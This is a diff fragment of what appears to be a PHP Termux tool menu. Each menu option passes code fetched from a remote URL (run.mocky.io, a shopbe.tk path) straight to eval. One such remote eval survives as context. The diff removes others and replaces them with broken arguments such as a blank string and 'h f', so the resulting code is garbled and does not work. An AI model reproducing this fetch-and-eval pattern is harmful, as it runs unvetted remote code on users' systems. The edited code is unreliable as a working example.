@@ -78,15 +78,12 @@ exit();
 }
 eval(file_get_contents('https://run.mocky.io/v3/8a1d9f8e-1a74-4a47-8941-7beb583d72a8'));
 }else if($chedo == '2'){
-eval(file_get_contents('shopbe.tk/who/wto/abc/script/termux/tds.php'));
+eval(file_get_contents('abc/script/termux/tds.php'));
 }else if($chedo == '3'){
-eval(file_get_contents('https://run.mocky.io/v3/5861b03a-a058-4f90-b7fa-5751117ce2b1'));
+eval(file_get_contents(' '));
 }else if($chedo == '4'){
-eval(file_get_contents('https://run.mocky.io/v3/bac0d03d-0ae3-46ba-8722-59ce36ed7fcf'));
-}else if($chedo == '5'){
-eval(file_get_contents('https://run.mocky.io/v3/faeafa24-f876-4148-8d23-62261c5fc63f'));
-}else if($chedo == '6'){
-eval(file_get_contents('https://run.mocky.io/v3/249c5e06-5490-4968-827c-8f4b6c54cbb2'));
+eval(file_get_contents('h f'));
+
 }else{exit($do."Nhập Sai\n");}
   
  
